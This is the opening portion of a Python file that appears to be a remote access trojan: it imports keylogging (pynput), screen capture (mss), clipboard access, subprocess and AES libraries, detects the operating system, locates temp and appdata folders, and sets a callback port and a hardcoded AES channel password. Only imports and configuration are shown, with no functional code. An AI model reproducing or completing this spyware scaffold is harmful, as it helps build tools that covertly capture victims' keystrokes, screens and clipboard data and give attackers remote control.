
import socket
import ctypes
import platform
import shutil
from mss import mss
import pyperclip
import os
import sys
import subprocess
import json
import os
from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import base64
import pynput.keyboard
import threading

global ip, port, TMP, APPDATA, path, os_type, access_password, password

# detect OS type ###############
if "Linux" in platform.uname():
	os_type = "linux"
else:
	os_type = "windows"

# set windows temp and appdata directory ######
if os_type == "windows":
	try:
		TMP = os.environ["TEMP"]
		APPDATA = os.environ["APPDATA"]
	except:
		pass
else:
	TMP = "/tmp"

# connection/access settings ##############
dns = '0.0.0.0'
port = 6000
ip = socket.gethostbyname(dns)
# AES channel password ##############
password = 'djknBDS89dHFS(*HFSD())'
